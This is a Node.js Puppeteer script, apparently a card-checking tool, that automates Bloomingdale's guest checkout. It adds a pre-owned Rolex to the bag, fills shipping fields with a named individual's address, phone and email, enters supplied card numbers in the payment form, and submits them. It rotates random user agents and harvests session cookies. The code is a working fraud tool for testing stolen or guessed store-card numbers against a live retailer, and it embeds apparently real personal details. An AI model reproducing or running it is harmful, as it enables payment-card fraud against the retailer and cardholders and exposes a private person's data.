var unirest = require('unirest');
var bloomHelper = require('./bloomHelper');
var utils = require('../utils');
var puppeteer = require('puppeteer');
var process = require('process');
var randomUserAgent = require('random-user-agent');

process.setMaxListeners(0)

var checkCardNumber = {
    checkCard: async function (page, cardNumber) {
        let result = {
            success: false,
            checked: false,
            cardNumber: cardNumber,
            loyaltyNumber: '',
            lastName: '',
            zipCode: '',
        }

        try {


            if (await page.$("#rc-errorOverlay-action") !== null) {
                await page.reload();
                await page.waitFor(10000);
            }

            if (await page.$("#rc-payment-info > div > div:nth-child(2) > div") !== null) {
                await page.click("#rc-payment-info > div > div:nth-child(2) > div");
                await page.waitFor(1000);
            }

            if (await page.$("#rc-payments-list-form > fieldset > ul > li > div > div.editable-cell > button") !== null) {
                await page.click("#rc-payments-list-form > fieldset > ul > li > div > div.editable-cell > button");
                await page.waitFor(1000);
            }

            await page.waitForSelector("#creditCard\\2e cardNumber", {
                timeout: 5000
            }).catch(() => {});

            if (await page.$("#creditCard\\2e cardNumber") == null) {
                await page.reload();
                await page.waitFor(5000);
                await page.waitForSelector("#creditCard\\2e cardNumber", {
                    timeout: 10000
                }).catch(() => {});
            }

            if (await page.$("#creditCard\\2e cardNumber") !== null) {

                await page.select('#creditCard\\2e cardType\\2e code', 'U');

                await page.evaluate((cardNumber) => {
                    document.querySelector("#creditCard\\2e cardNumber").value = cardNumber
                    if (document.querySelector("#billingContact\\2e email") !== null) {
                        document.querySelector("#billingContact\\2e email").value = "mailbloomcheckcard@gmail.com"
                    }
                }, cardNumber)

                await page.waitFor(500);
                await page.click("#rc-payment-continue");

                await page.waitFor(3000);

            }

        } catch (msg) {
            console.log(msg);

        } finally {
            return result;
        }

    },
    bloomBuildCheckCard: async (showBrowser) => {

        let dataBuilder = {
            product : 'https://www.bloomingdales.com/shop/product/pre-owned-rolex-stainless-steel-18k-yellow-gold-two-tone-datejust-watch-with-mother-of-pearl-dial-diamonds-36mm?ID=1634963&upc_ID=2774880&Quantity=1',
            shipping : {
                firstName : "Maddie",
                lastName : "Pendolino",
                address : "1220 Bernal Ave",
                city : "Burlingame",
                state : "CA",
                zipCode : "94010",
                phone : "650-676-5053",
                email : "chantalbrousseau@aol.com",
            }
        }

        let blockAllowLoad = ['script', 'xhr', 'document'];

        let modePuppeteer = {
            headless: showBrowser,
            ignoreHTTPSErrors: true,
            args: ['--start-maximized', '--no-sandbox', '--hide-scrollbars', '--mute-audio', '--disable-setuid-sandbox', '--disable-sync', '--disable-background-networking', '--disable-infobars', '--disable-setuid-sandbox', '--ignore-certifcate-errors']
        };
        let loginSuccess = false;
        let detailLogin = {};

        let browser = await puppeteer.launch(modePuppeteer);
        let page = (await browser.pages())[0];

        let userAgent = randomUserAgent();

        if (showBrowser) {
            
            await page.setRequestInterception(true);
            page.on('request', (req) => {
                if (blockAllowLoad.includes(req.resourceType())) {
                    req.continue();
                } else {
                    req.abort();
                }
            });
        }

        await page.setUserAgent(userAgent);

        await page.setViewport({
            width: 1368,
            height: 720
        });

        await page.goto("https://www.bloomingdales.com").catch(() => {});
        await page.goto(dataBuilder.product).catch(() => {});

        await page.evaluate((dataBuilder) => {
            if (document.querySelector("button.add-to-bag") !== null) {
                document.querySelector("button.add-to-bag").click()
            }
            
        }, dataBuilder);

        await page.goto("https://www.bloomingdales.com/chkout/startguestcheckout?bypass_redirect=true").catch(() => {});
        await page.goto("https://www.bloomingdales.com/chkout/startguestcheckout?bypass_redirect=true").catch(() => {});

        await page.goto("https://www.bloomingdales.com/chkout/startguestcheckout?bypass_redirect=true").catch(() => {});

        await page.waitForSelector("#rc-shipping-continue",{timeout : 10000}).catch (() => {

        });
        await page.evaluate((dataBuilder) => {
            if (document.querySelector("#rc-shipping-continue") !== null)  {
                document.querySelector("#contact\\2e firstName").value = dataBuilder.shipping.firstName
                document.querySelector("#contact\\2e lastName").value = dataBuilder.shipping.lastName
                document.querySelector("#address\\2e addressLine1").value = dataBuilder.shipping.address
                document.querySelector("#address\\2e city").value = dataBuilder.shipping.city
                document.querySelector("#address\\2e zipCode").value = dataBuilder.shipping.zipCode
                document.querySelector("#address\\2e state").value = dataBuilder.shipping.state
                document.querySelector("#address\\2e phone").value = dataBuilder.shipping.phone
                document.querySelector("#rc-shipping-continue").click()
            }
        }, dataBuilder);

        await page.waitFor(5000);
        let cookie = await page.cookies();
        await page.close();
        await browser.close();

        return cookie
        
    }
}
module.exports = checkCardNumber;